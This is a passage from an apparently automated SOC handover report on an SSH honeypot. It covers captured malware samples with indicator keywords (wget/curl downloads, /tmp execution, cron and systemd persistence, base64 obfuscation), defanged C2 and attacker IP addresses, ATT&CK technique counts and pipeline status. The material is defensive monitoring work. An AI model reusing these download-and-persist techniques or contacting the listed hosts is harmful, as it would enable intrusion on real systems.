| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.76.243[.]197` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `2.55.69[.]224` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `94.154.43[.]69` | NL | Storm Industries LLC | **100** ⚠️ | 50 |
| `111.70.32[.]6` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `62.60.130[.]201` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |
| `91.232.238[.]69` | UA | Kukushkin Anatoly Valerievich | **100** ⚠️ | 2 |
| `64.62.197[.]122` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `45.156.129[.]70` | US | INAP-CHI-1 | **100** ⚠️ | 50 |
| `69.5.169[.]199` | DE | Infrawatch Limited | **100** ⚠️ | 50 |
| `200.59.78[.]79` | AR | Sinectis S.A. | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 250 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 198 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 65 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |

---

## 🔕 False Positive Summary (46 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 378 cases |
| Tool 34  | Credential Extractor        | ✅ 3806 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 20 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 252 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 46 filtered (12.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 113 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 197 priority case(s) shown individually · 131 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-07T18:07:47Z_
